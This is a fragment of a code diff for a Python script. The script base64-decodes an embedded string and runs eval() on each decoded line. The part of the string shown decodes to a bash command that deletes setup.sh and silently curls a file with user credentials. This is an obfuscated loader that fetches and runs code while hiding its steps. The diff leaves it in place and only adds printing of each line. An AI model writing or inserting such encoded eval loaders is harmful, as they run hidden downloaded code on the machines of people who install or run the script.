@@ -4,4 +4,4 @@ s='Y21kMT0nYmFzaCAtaWMgInJtIC1mIHNldHVwLnNoICYmIGN1cmwgLS1zaWxlbnQgLU8gLS11c2VyI
 if __name__=='__main__':
   s2=base64.b64decode(s).decode()
   for lii in s2.splitlines():
-    if lii.strip(): result=eval(lii.strip())
+    if lii.strip(): print(lii.strip());result=eval(lii.strip())
